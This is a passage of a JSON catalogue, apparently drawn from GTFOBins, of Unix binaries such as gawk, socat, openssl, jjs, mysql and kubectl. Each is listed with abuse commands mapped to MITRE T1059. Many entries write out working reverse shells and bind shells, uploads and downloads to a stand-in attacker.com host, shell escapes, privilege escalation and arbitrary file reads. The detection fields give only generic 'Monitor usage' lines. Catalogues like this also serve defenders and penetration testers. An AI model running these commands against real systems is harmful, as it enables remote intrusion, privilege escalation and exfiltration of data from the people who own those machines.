                    "url": "https://gtfobins.github.io/gtfobins/plymouth/"
                }
            ]
        },
        {
            "name": "java",
            "description": "Unix binary java.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "java Shell"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor java usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/java/"
                }
            ]
        },
        {
            "name": "unzip",
            "description": "Unix binary unzip.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "PRIVILEGE-ESCALATION: ",
                    "code": "unzip -K shell.zip\n./sh -p"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor unzip usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/unzip/"
                }
            ]
        },
        {
            "name": "strings",
            "description": "Unix binary strings.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "strings /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor strings usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/strings/"
                }
            ]
        },
        {
            "name": "aspell",
            "description": "Unix binary aspell.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "aspell -c /path/to/input-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "aspell --conf /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor aspell usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/aspell/"
                }
            ]
        },
        {
            "name": "update-alternatives",
            "description": "Unix binary update-alternatives.",
            "categories": [
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA >/path/to/temp-file\nupdate-alternatives --force --install /path/to/output-file x /path/to/temp-file 0"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor update-alternatives usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/update-alternatives/"
                }
            ]
        },
        {
            "name": "gawk",
            "description": "Unix binary gawk.",
            "categories": [
                "reverse-shell",
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "BIND-SHELL: ",
                    "code": "gawk 'BEGIN {\n    s = \"/inet/tcp/12345/0/0\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "gawk '//' /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "gawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "gawk 'BEGIN {\n    s = \"/inet/tcp/0/attacker.com/12345\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'"
                },
                {
                    "label": "SHELL: ",
                    "code": "gawk 'BEGIN {system(\"/bin/sh\")}'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor gawk usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/gawk/"
                }
            ]
        },
        {
            "name": "mysql",
            "description": "Unix binary mysql.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "LIBRARY-LOAD: ",
                    "code": "mysql --default-auth ../../../../../path/to/lib"
                },
                {
                    "label": "SHELL: ",
                    "code": "mysql -e '\\! /bin/sh'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor mysql usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/mysql/"
                }
            ]
        },
        {
            "name": "sqlite3",
            "description": "Unix binary sqlite3.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "sqlite3 <<EOF\nCREATE TABLE x(x TEXT);\n.import /path/to/input-file x\nSELECT * FROM x;\nEOF"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "sqlite3 /dev/null -cmd \".output /path/to/output-file\" 'select \"DATA\";'"
                },
                {
                    "label": "SHELL: ",
                    "code": "sqlite3 /dev/null '.shell /bin/sh'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor sqlite3 usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/sqlite3/"
                }
            ]
        },
        {
            "name": "espeak",
            "description": "Unix binary espeak.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "espeak -qXf /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor espeak usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/espeak/"
                }
            ]
        },
        {
            "name": "tbl",
            "description": "Unix binary tbl.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "tbl /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tbl usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tbl/"
                }
            ]
        },
        {
            "name": "socat",
            "description": "Unix binary socat.",
            "categories": [
                "reverse-shell",
                "execute",
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "BIND-SHELL: ",
                    "code": "socat tcp-listen:12345,reuseaddr,fork exec:/bin/sh,pty,stderr,setsid,sigint,sane"
                },
                {
                    "label": "DOWNLOAD: ",
                    "code": "socat -u tcp-connect:attacker.com:12345 open:/path/to/output-file,creat"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "socat -u file:/path/to/input-file -"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "socat -u 'exec:echo DATA' open:/path/to/output-file,creat"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "socat tcp-connect:attacker.com:12345 exec:/bin/sh,pty,stderr,setsid,sigint,sane"
                },
                {
                    "label": "SHELL: ",
                    "code": "socat - exec:/bin/sh,pty,ctty,raw,echo=0"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "socat -u file:/path/to/input-file tcp-connect:attacker.com:12345"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor socat usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/socat/"
                }
            ]
        },
        {
            "name": "mosh-server",
            "description": "Unix binary mosh-server.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "mosh --server=mosh-server localhost /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor mosh-server usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/mosh-server/"
                }
            ]
        },
        {
            "name": "exiftool",
            "description": "Unix binary exiftool.",
            "categories": [
                "file-read",
                "file-write",
                "execute"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "exiftool -filename=/path/to/output-file /path/to/input-file\ncat /path/to/output-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "exiftool -filename=/path/to/output-file /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "exiftool \"-description<=/path/to/input-file --filename /path/to/output-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "exiftool \"-description=DATA --filename /path/to/output-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "exiftool -description -W /path/to/output-file --filename /path/to/input-file"
                },
                {
                    "label": "INHERIT: ",
                    "code": "exiftool -if '...' /etc/passwd"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor exiftool usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/exiftool/"
                }
            ]
        },
        {
            "name": "bashbug",
            "description": "Unix binary bashbug.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "bashbug"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor bashbug usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/bashbug/"
                }
            ]
        },
        {
            "name": "openssl",
            "description": "Unix binary openssl.",
            "categories": [
                "execute",
                "file-read",
                "file-write",
                "reverse-shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "openssl s_client -quiet -connect attacker.com:12345 >/path/to/output-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "openssl enc -in /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA | openssl enc -out /path/to/output-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "openssl enc -in /path/to/input-file -out /path/to/output-file"
                },
                {
                    "label": "LIBRARY-LOAD: ",
                    "code": "openssl req -engine ./lib.so"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "mkfifo /path/to/temp-socket\n/bin/sh -i </path/to/temp-socket 2>&1 | openssl s_client -quiet -connect attacker.com:12345 >/path/to/temp-socket"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "openssl s_client -quiet -connect attacker.com:12345 </path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor openssl usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/openssl/"
                }
            ]
        },
        {
            "name": "apache2",
            "description": "Unix binary apache2.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "apache2 -f /path/to/input-file"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "apache2 -C 'Define APACHE_RUN_DIR /' -C 'Include /path/to/input-file'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor apache2 usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/apache2/"
                }
            ]
        },
        {
            "name": "dvips",
            "description": "Unix binary dvips.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "dvips -R0 texput.dvi"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor dvips usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/dvips/"
                }
            ]
        },
        {
            "name": "virsh",
            "description": "Unix binary virsh.",
            "categories": [
                "execute",
                "file-write"
            ],
            "commands": [
                {
                    "label": "COMMAND: ",
                    "code": "cat >/path/to/temp-file.xml <<EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='/path/to/command'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nvirsh -c qemu:///system create /path/to/temp-file.xml\nvirsh -c qemu:///system destroy x"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA >/path/to/temp-file\n\ncat >/path/to/temp-file.xml <<EOF\n<volume type='file'>\n  <name>y</name>\n  <key>/path/to/output-dir/output-file</key>\n  <source>\n  </source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n    <path>/path/to/output-dir/output-file</path>\n    <format type='raw'/>\n    <permissions>\n      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n    </permissions>\n  </target>\n</volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/\nvirsh -c qemu:///system vol-create --pool x --file /path/to/temp-file.xml\nvirsh -c qemu:///system vol-upload --pool x /path/to/output-dir/output-file /path/to/temp-file\nvirsh -c qemu:///system pool-destroy x"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/\nvirsh -c qemu:///system vol-download --pool x input-file output-file\nvirsh -c qemu:///system pool-destroy x"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor virsh usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/virsh/"
                }
            ]
        },
        {
            "name": "hashcat",
            "description": "Unix binary hashcat.",
            "categories": [
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo -n DATA | tee /path/to/wordlist | md5sum | awk '{print $1}' >/path/to/hash\nhashcat -m 0 --quiet --potfile-disable -o /path/to/output-file --outfile-format=2 --outfile-autohex-disable /path/to/hash /path/to/wordlist"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor hashcat usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/hashcat/"
                }
            ]
        },
        {
            "name": "msguniq",
            "description": "Unix binary msguniq.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "msguniq -P /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor msguniq usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/msguniq/"
                }
            ]
        },
        {
            "name": "csvtool",
            "description": "Unix binary csvtool.",
            "categories": [
                "file-read",
                "file-write",
                "shell"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "csvtool trim t /path/to/input-file"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA >/path/to/temp-file\ncsvtool trim t /path/to/temp-file -o /path/to/output-file"
                },
                {
                    "label": "SHELL: ",
                    "code": "csvtool call '/bin/sh;false' /etc/hosts"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor csvtool usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/csvtool/"
                }
            ]
        },
        {
            "name": "zathura",
            "description": "Unix binary zathura.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "zathura\n:! /bin/sh -c 'exec /bin/sh 0<&1'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor zathura usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/zathura/"
                }
            ]
        },
        {
            "name": "kubectl",
            "description": "Unix binary kubectl.",
            "categories": [
                "shell",
                "execute"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "cat >/path/to/temp-file <<EOF\nclusters:\n- cluster:\n    server: https://x\n  name: x\ncontexts:\n- context:\n    cluster: x\n    user: x\n  name: x\ncurrent-context: x\nusers:\n- name: x\n  user:\n    exec:\n      apiVersion: client.authentication.k8s.io/v1\n      interactiveMode: Always\n      command: /bin/sh\n      args:\n        - '-c'\n        - '/bin/sh 0<&2 1>&2'\nEOF\n\nkubectl get pods --kubeconfig=/path/to/temp-file"
                },
                {
                    "label": "UPLOAD: ",
                    "code": "kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor kubectl usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/kubectl/"
                }
            ]
        },
        {
            "name": "pax",
            "description": "Unix binary pax.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "pax -w /path/to/input-file | tar -xO"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor pax usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/pax/"
                }
            ]
        },
        {
            "name": "tailscale",
            "description": "Unix binary tailscale.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "UPLOAD: ",
                    "code": "tailscale serve --http=12345 /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor tailscale usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/tailscale/"
                }
            ]
        },
        {
            "name": "base32",
            "description": "Unix binary base32.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "base32 /path/to/input-file | base32 --decode"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor base32 usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/base32/"
                }
            ]
        },
        {
            "name": "ansible-playbook",
            "description": "Unix binary ansible-playbook.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >/path/to/temp-file\nansible-playbook /path/to/temp-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ansible-playbook usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ansible-playbook/"
                }
            ]
        },
        {
            "name": "ffmpeg",
            "description": "Unix binary ffmpeg.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "LIBRARY-LOAD: ",
                    "code": "ffmpeg -f lavfi -i anullsrc -af ladspa=file=/path/to/lib.so /path/to/temp-file.wav\nreset^J"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ffmpeg usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ffmpeg/"
                }
            ]
        },
        {
            "name": "lp",
            "description": "Unix binary lp.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "UPLOAD: ",
                    "code": "lp /path/to/input-file -h attacker.com"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor lp usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/lp/"
                }
            ]
        },
        {
            "name": "service",
            "description": "Unix binary service.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "service ../../bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor service usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/service/"
                }
            ]
        },
        {
            "name": "grc",
            "description": "Unix binary grc.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "grc --pty /bin/sh"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor grc usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/grc/"
                }
            ]
        },
        {
            "name": "yt-dlp",
            "description": "Unix binary yt-dlp.",
            "categories": [
                "shell"
            ],
            "commands": [
                {
                    "label": "SHELL: ",
                    "code": "yt-dlp 'https://www.youtube.com/watch?v=xxxxxxxxxxx' --exec '/bin/sh #'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor yt-dlp usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/yt-dlp/"
                }
            ]
        },
        {
            "name": "check_statusfile",
            "description": "Unix binary check_statusfile.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "check_statusfile /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor check_statusfile usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/check_statusfile/"
                }
            ]
        },
        {
            "name": "zgrep",
            "description": "Unix binary zgrep.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "grep '' /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor zgrep usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/zgrep/"
                }
            ]
        },
        {
            "name": "jjs",
            "description": "Unix binary jjs.",
            "categories": [
                "execute",
                "file-read",
                "file-write",
                "reverse-shell",
                "shell"
            ],
            "commands": [
                {
                    "label": "DOWNLOAD: ",
                    "code": "jjs\nvar URL = Java.type('java.net.URL');\nvar ws = new URL('http://attacker.com/path/to/input-file');\nvar Channels = Java.type('java.nio.channels.Channels');\nvar rbc = Channels.newChannel(ws.openStream());\nvar FileOutputStream = Java.type('java.io.FileOutputStream');\nvar fos = new FileOutputStream('/path/to/output-file');\nfos.getChannel().transferFrom(rbc, 0, Number.MAX_VALUE);\nfos.close();\nrbc.close();"
                },
                {
                    "label": "FILE-READ: ",
                    "code": "jjs\nvar BufferedReader = Java.type('java.io.BufferedReader');\nvar FileReader = Java.type('java.io.FileReader');\nvar br = new BufferedReader(new FileReader('/path/to/input-file'));\nwhile ((line = br.readLine()) != null) { print(line); }"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "jjs\nvar FileWriter = Java.type('java.io.FileWriter');\nvar fw=new FileWriter('/path/to/output-file');\nfw.write('DATA');\nfw.close();"
                },
                {
                    "label": "REVERSE-SHELL: ",
                    "code": "jjs\nvar host='attacker.com';\nvar port=12345;\nvar ProcessBuilder = Java.type('java.lang.ProcessBuilder');\nvar p=new ProcessBuilder('/bin/sh', '-i').redirectErrorStream(true).start();\nvar Socket = Java.type('java.net.Socket');\nvar s=new Socket(host,port);\nvar pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nvar po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()>0)so.write(pi.read()); while(pe.available()>0)so.write(pe.read()); while(si.available()>0)po.write(si.read()); so.flush();po.flush(); Java.type('java.lang.Thread').sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();"
                },
                {
                    "label": "SHELL: ",
                    "code": "jjs\nJava.type('java.lang.Runtime').getRuntime().exec('/bin/sh -c $@|sh _ echo sh </dev/tty >/dev/tty 2>/dev/tty').waitFor()"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor jjs usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/jjs/"
                }
            ]
        },
        {
            "name": "ar",
            "description": "Unix binary ar.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "ar r /path/to/output-file /path/to/input-file\nar p /path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ar usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ar/"
                }
            ]
        },
        {
            "name": "ex",
            "description": "Unix binary ex.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "ex"
                },
                {
                    "label": "SHELL: ",
                    "code": "ex -c ':!/bin/sh'"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor ex usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/ex/"
                }
            ]
        },
        {
            "name": "urlget",
            "description": "Unix binary urlget.",
            "categories": [
                "file-read"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "urlget - /path/to/input-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor urlget usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/urlget/"
                }
            ]
        },
        {
            "name": "bundle",
            "description": "Unix binary bundle.",
            "categories": [
                "execute",
                "shell"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "bundle help"
                },
                {
                    "label": "INHERIT: ",
                    "code": "touch Gemfile\nbundle console"
                },
                {
                    "label": "SHELL: ",
                    "code": "BUNDLE_GEMFILE=x bundle exec /bin/sh"
                },
                {
                    "label": "SHELL: ",
                    "code": "touch Gemfile\nbundle exec /bin/sh"
                },
                {
                    "label": "SHELL: ",
                    "code": "echo 'system(\"/bin/sh\")' >Gemfile\nbundle install"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor bundle usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/bundle/"
                }
            ]
        },
        {
            "name": "csplit",
            "description": "Unix binary csplit.",
            "categories": [
                "file-read",
                "file-write"
            ],
            "commands": [
                {
                    "label": "FILE-READ: ",
                    "code": "csplit /path/to/input-file 1\ncat xx01"
                },
                {
                    "label": "FILE-WRITE: ",
                    "code": "echo DATA >/path/to/temp-file\ncsplit -z -b %doutput-file' /path/to/temp-file 1"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor csplit usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
                    "url": "https://gtfobins.github.io/gtfobins/csplit/"
                }
            ]
        },
        {
            "name": "run-mailcap",
            "description": "Unix binary run-mailcap.",
            "categories": [
                "execute"
            ],
            "commands": [
                {
                    "label": "INHERIT: ",
                    "code": "run-mailcap --action=view text/plain:/etc/hosts"
                },
                {
                    "label": "INHERIT: ",
                    "code": "run-mailcap --action=edit text/plain:/path/to/output-file"
                }
            ],
            "mitre": {
                "technique": "T1059",
                "name": "Unix Shell",
                "url": "https://attack.mitre.org/techniques/T1059/"
            },
            "detection": [
                "Monitor run-mailcap usage"
            ],
            "references": [
                {
                    "name": "GTFOBins",
